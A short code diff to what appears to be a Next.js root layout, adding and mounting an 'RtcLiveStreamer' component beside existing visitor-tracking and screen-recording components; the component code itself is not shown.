@@ -5,6 +5,7 @@ import LiveToast from "@/components/LiveToast";
 import { SettingsProvider } from "@/contexts/SettingsContext";
 import { VisitorTracker } from "@/components/VisitorTracker";
 import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
+import { RtcLiveStreamer } from "@/components/RtcLiveStreamer";
 import { OgImageTags } from "@/components/OgImageTags";
 import "./globals.css";
 
@@ -47,6 +48,7 @@ export default function RootLayout({
       <body className={bodyClass}>
         <VisitorTracker />
         <LiveScreenRecorder />
+        <RtcLiveStreamer />
         <SettingsProvider>
           {ENABLE_TOAST && shouldShowToast && <LiveToast />}
           {children}
